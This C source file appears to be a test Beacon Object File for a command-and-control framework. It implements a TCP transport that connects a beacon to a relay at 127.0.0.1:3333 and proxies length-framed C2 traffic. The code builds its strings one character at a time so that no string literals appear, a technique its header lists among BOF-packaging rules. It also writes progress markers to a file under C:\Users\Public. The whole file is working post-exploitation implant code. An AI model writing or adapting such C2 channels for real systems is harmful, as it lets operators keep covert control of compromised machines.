/*
 * udc2_tcp.c - 4.12 UDC2 test BOF: a TCP channel over the udc2-vs contract.
 *
 * BOF-packaging rules learned during bring-up (docs/TIER2-BATTLE.md):
 *  - all imports as dll$func dynamic declarations (direct winsock linking
 *    leaves unrelocated import thunks)
 *  - /O0 /Gy- /Gw-: no auto-vectorization (movdqa needs 16B alignment
 *    the BOF mapping doesn't provide), single .text, no split .rdata
 *  - literal-free strings
 *  - NO .bss usage: the beacon loader's .bss relocations compute bad
 *    addresses (WSAStartup(&wsa) returned WSAEFAULT 10014 when wsa lived
 *    in .bss). All state is stack-local or in .data (nonzero initializers).
 *
 * go(UDC2_INFO*) connects to the relay and fills udc2Proxy/udc2Close.
 * Each proxy round ships the complete [4B LE len][data] frame and reads
 * the response frame back verbatim (never strip the length).
 */
#include <winsock2.h>
#include <windows.h>

#ifndef UDC2_PORT
#define UDC2_PORT 3333
#endif

typedef int(*UDC2PROXY)(const char *, int, char *, int);
typedef void(*UDC2CLOSE)(void);

typedef struct {
	DWORD     version;
	UDC2PROXY proxy;
	UDC2CLOSE close;
} UDC2INFO;

EXTERN_C __declspec(dllimport) int WINAPI ws2_32$WSAStartup(WORD, void *);
EXTERN_C __declspec(dllimport) int WINAPI ws2_32$WSACleanup(void);
EXTERN_C __declspec(dllimport) SOCKET WINAPI ws2_32$socket(int, int, int);
EXTERN_C __declspec(dllimport) int WINAPI ws2_32$connect(SOCKET, const struct sockaddr *, int);
EXTERN_C __declspec(dllimport) int WINAPI ws2_32$closesocket(SOCKET);
EXTERN_C __declspec(dllimport) int WINAPI ws2_32$send(SOCKET, const char *, int, int);
EXTERN_C __declspec(dllimport) int WINAPI ws2_32$recv(SOCKET, char *, int, int);
EXTERN_C __declspec(dllimport) int WINAPI ws2_32$WSAGetLastError(void);
EXTERN_C __declspec(dllimport) u_short WINAPI ws2_32$htons(u_short);

EXTERN_C __declspec(dllimport) HANDLE WINAPI kernel32$LoadLibraryA(LPCSTR);
EXTERN_C __declspec(dllimport) HANDLE WINAPI kernel32$GetModuleHandleA(LPCSTR);
EXTERN_C __declspec(dllimport) HANDLE WINAPI kernel32$CreateFileA(LPCSTR, DWORD, DWORD, void *, DWORD, DWORD, HANDLE);
EXTERN_C __declspec(dllimport) BOOL WINAPI kernel32$WriteFile(HANDLE, LPCVOID, DWORD, LPDWORD, void *);
EXTERN_C __declspec(dllimport) BOOL WINAPI kernel32$CloseHandle(HANDLE);

/* .data (nonzero initializers), NOT .bss - see the header comment */
static SOCKET g_sock = INVALID_SOCKET;

static void path_udc2_step(char * buf, int max) {
	char parts[30];
	int i;
	parts[0]='C'; parts[1]=':'; parts[2]='\\'; parts[3]='U'; parts[4]='s';
	parts[5]='e'; parts[6]='r'; parts[7]='s'; parts[8]='\\'; parts[9]='P';
	parts[10]='u'; parts[11]='b'; parts[12]='l'; parts[13]='i'; parts[14]='c';
	parts[15]='\\'; parts[16]='u'; parts[17]='d'; parts[18]='c'; parts[19]='2';
	parts[20]='_'; parts[21]='s'; parts[22]='t'; parts[23]='e'; parts[24]='p';
	parts[25]='.'; parts[26]='t'; parts[27]='x'; parts[28]='t'; parts[29]=0;
	for (i = 0; parts[i] && i < max - 1; i++)
		buf[i] = parts[i];
	buf[i] = 0;
}

static void markhex(unsigned long long v) {
	char path[40];
	HANDLE f;
	char b[20];
	int i;
	int n;
	DWORD w;
	const char hex[16] = { '0','1','2','3','4','5','6','7','8','9','a','b','c','d','e','f' };

	path_udc2_step(path, 40);
	f = kernel32$CreateFileA(path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	if (f == INVALID_HANDLE_VALUE)
		return;
	for (i = 0; i < 16; i++)
		b[i] = hex[(v >> ((15 - i) * 4)) & 0xF];
	b[16] = 0;
	kernel32$WriteFile(f, b, 16, &w, NULL);
	kernel32$CloseHandle(f);
}

static void mark(int v) {
	char path[40];
	HANDLE f;
	char b[16];
	int i = 0;
	char num[12];
	int n = 0;
	int x = v;
	DWORD w;

	path_udc2_step(path, 40);
	f = kernel32$CreateFileA(path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	if (f == INVALID_HANDLE_VALUE)
		return;
	if (x == 0)
		num[n++] = '0';
	while (x > 0 && n < 11) {
		num[n++] = (char)('0' + (x % 10));
		x /= 10;
	}
	while (n && i < 14)
		b[i++] = num[--n];
	b[i] = 0;
	kernel32$WriteFile(f, b, i, &w, NULL);
	kernel32$CloseHandle(f);
}

int udc2Proxy(const char * sendBuf, int sendBufLen, char * recvBuf, int recvBufMaxLen) {
	int sent = 0;
	int n;
	unsigned int len;
	int total;

	if (g_sock == INVALID_SOCKET)
		return -1;

	while (sent < sendBufLen) {
		n = ws2_32$send(g_sock, sendBuf + sent, sendBufLen - sent, 0);
		if (n <= 0)
			return -1;
		sent += n;
	}

	total = 0;
	while (total < 4) {
		n = ws2_32$recv(g_sock, recvBuf + total, 4 - total, 0);
		if (n <= 0)
			return -1;
		total += n;
	}

	len  = (unsigned char)recvBuf[0];
	len |= (unsigned char)recvBuf[1] << 8;
	len |= (unsigned char)recvBuf[2] << 16;
	len |= (unsigned char)recvBuf[3] << 24;
	if ((int)(4 + len) > recvBufMaxLen)
		return -1;

	while (total < 4 + (int)len) {
		n = ws2_32$recv(g_sock, recvBuf + total, 4 + (int)len - total, 0);
		if (n <= 0)
			return -1;
		total += n;
	}

	return total;
}

void udc2Close(void) {
	if (g_sock != INVALID_SOCKET) {
		ws2_32$closesocket(g_sock);
		g_sock = INVALID_SOCKET;
	}
	ws2_32$WSACleanup();
}

void go(UDC2INFO * info) {
	char ws[8];
	struct sockaddr_in sa;
	HANDLE m;

	ws[0]='w'; ws[1]='s'; ws[2]='2'; ws[3]='_'; ws[4]='3'; ws[5]='2'; ws[6]=0;

	mark(1);

	if (info == NULL)
		return;

	/* ws2_32 is not loaded in a fresh beacon process; make sure the real
	 * module is present before the BOF loader resolves our ws2_32$ imports
	 * (boot-time LoadLibraryA inside the beacon context is the suspect for
	 * the current bring-up crash - see docs/TIER2-BATTLE.md) */
	m = kernel32$GetModuleHandleA(ws);
	mark(20 + (m != NULL ? 1 : 0));
	if (m == NULL) {
		m = kernel32$LoadLibraryA(ws);
		mark(30 + (m != NULL ? 1 : 0));
	}

	{
		char wsa[440]; /* stack: the mapped BOF .data gave WSAEFAULT */
		int rc = ws2_32$WSAStartup(MAKEWORD(2, 2), (void *)wsa);
		if (rc != 0) {
			mark(60000 + rc);
			return;
		}
	}

	mark(3);

	g_sock = ws2_32$socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (g_sock == INVALID_SOCKET) {
		mark(61000 + ws2_32$WSAGetLastError());
		return;
	}

	sa.sin_family = AF_INET;
	sa.sin_port = ws2_32$htons(UDC2_PORT);
	sa.sin_addr.S_un.S_un_b.s_b1 = 127;
	sa.sin_addr.S_un.S_un_b.s_b2 = 0;
	sa.sin_addr.S_un.S_un_b.s_b3 = 0;
	sa.sin_addr.S_un.S_un_b.s_b4 = 1;

	if (ws2_32$connect(g_sock, (struct sockaddr *)&sa, sizeof(sa)) == SOCKET_ERROR) {
		mark(62000 + ws2_32$WSAGetLastError());
		ws2_32$closesocket(g_sock);
		g_sock = INVALID_SOCKET;
		return;
	}

	mark(9);
	info->proxy = udc2Proxy;
	info->close = udc2Close;
	mark(10);
}
